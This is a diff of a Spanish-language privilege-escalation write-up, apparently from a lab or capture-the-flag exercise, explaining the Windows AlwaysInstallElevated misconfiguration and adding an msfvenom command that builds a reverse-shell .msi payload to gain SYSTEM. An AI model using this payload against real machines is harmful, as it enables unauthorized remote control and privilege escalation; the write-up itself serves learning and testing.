@@ -106,4 +106,13 @@ Una vez en la maquina lo ejecutaremos, en la salida obtenida observamos
 Encontramos `AlwaysInstallElevated` el cual esta seteado en `1` tanto en el `HKLM` y `HKCU`, nos podemos aprovechar de ellos para elevar privilegios
 [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=AlwaysInstallElevated#alwaysinstallelevated]
 
-Lo que nos permite tener estos dos registros acticvad
+Lo que nos permite tener estos dos registros activados es que se le permite al usuario instalar y ejecutar archivos `.msi` como `NT AUTHORITY\SYSTEM`
+
+# Explotación
+## Abuso de AlwaysInstallElevated
+
+Nos vamos a crear un fichero `.msi` usando [[MSFVENOM]] utilizando
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 -f msi -o reverse.msi
+```
+
